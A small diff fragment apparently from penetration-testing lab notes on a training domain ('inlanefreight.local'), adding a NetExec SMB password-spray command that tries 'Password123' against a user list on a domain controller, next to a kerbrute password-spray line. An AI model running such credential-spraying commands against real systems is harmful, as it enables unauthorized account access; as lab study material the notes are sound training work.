@@ -382,6 +382,7 @@ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  W
 - Using nxc-:
 
 ```bash
+nxc smb 172.16.5.5 -u [file_name] -p Password123 | grep +
 ```
 
 - Validating with nxc-:
